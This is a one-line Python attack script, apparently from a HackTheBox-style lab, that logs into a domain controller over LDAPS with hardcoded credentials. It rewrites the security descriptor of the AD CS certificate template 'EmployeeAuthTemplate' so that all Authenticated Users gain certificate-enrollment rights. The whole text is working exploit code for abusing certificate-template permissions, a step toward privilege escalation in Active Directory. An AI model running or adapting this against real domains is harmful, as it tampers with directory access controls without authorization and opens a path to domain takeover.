python3 -c '
import ssl,struct,uuid
from ldap3 import Server,Connection,ALL,NTLM,Tls,MODIFY_REPLACE,BASE
from ldap3.protocol.microsoft import security_descriptor_control
tls=Tls(validate=ssl.CERT_NONE)
c=Connection(Server("10.129.9.60",port=636,use_ssl=True,tls=tls,get_info=ALL),user="DANGLINGTREE\jake.h",password="Password123!",authentication=NTLM,auto_bind=True)
DN="CN=EmployeeAuthTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb"
ctrl=security_descriptor_control(sdflags=0x4)
c.search(DN,"(objectClass=*)",search_scope=BASE,attributes=["nTSecurityDescriptor"],controls=ctrl)
sd=bytearray(c.entries[0]["nTSecurityDescriptor"].raw_values[0])
au=struct.pack("BB",1,1)+b"\x00\x00\x00\x00\x00\x05"+struct.pack("<I",11)
eg=uuid.UUID("0e10c968-78fb-11d2-90d4-00c04f79dc55").bytes_le
ab=struct.pack("<II",0x100,0x01)+eg+au
ace=struct.pack("BBH",5,0,4+len(ab))+ab
do=struct.unpack_from("<I",sd,16)[0];ds=struct.unpack_from("<H",sd,do+2)[0];ac=struct.unpack_from("<H",sd,do+4)[0];ip=do+ds
sd=sd[:ip]+bytearray(ace)+sd[ip:]
struct.pack_into("<H",sd,do+2,ds+len(ace));struct.pack_into("<H",sd,do+4,ac+1)
c.modify(DN,{"nTSecurityDescriptor":[(MODIFY_REPLACE,[bytes(sd)])]},controls=ctrl)
print("[+] Enrollment ACE added" if c.result["result"]==0 else "[-] "+str(c.result))'
